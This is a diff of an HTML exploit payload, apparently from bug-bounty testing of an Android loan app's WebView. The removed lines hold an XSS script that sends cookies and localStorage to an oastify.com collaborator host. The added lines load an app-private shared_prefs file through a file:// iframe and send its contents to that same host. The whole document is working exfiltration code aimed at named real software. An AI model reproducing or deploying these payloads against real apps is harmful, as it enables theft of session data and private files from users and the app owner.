@@ -1,3 +1,22 @@
-<html><body><script>
-document.location="https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/xss_exfil?cookie="+encodeURIComponent(document.cookie)+"&localStorage="+encodeURIComponent(JSON.stringify(localStorage))+"&origin="+encodeURIComponent(window.origin);
-</script></body></html>
+<html><body>
+<script>
+var iframe = document.createElement('iframe');
+iframe.src = 'file:///data/data/in.upstox.loans/shared_prefs/com.google.firebase.crashlytics.xml';
+iframe.onload = function() {
+  try {
+    var data = iframe.contentDocument.documentElement.outerHTML;
+    document.location = "https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/lfi_exfil?data=" + encodeURIComponent(data);
+  } catch(e) {
+    document.location = "https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/lfi_error?msg=" + encodeURIComponent(e.message);
+  }
+};
+iframe.onerror = function() {
+  document.location = "https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/iframe_error";
+};
+document.body.appendChild(iframe);
+// Fallback timeout
+setTimeout(function() {
+  document.location = "https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/timeout";
+}, 5000);
+</script>
+</body></html>
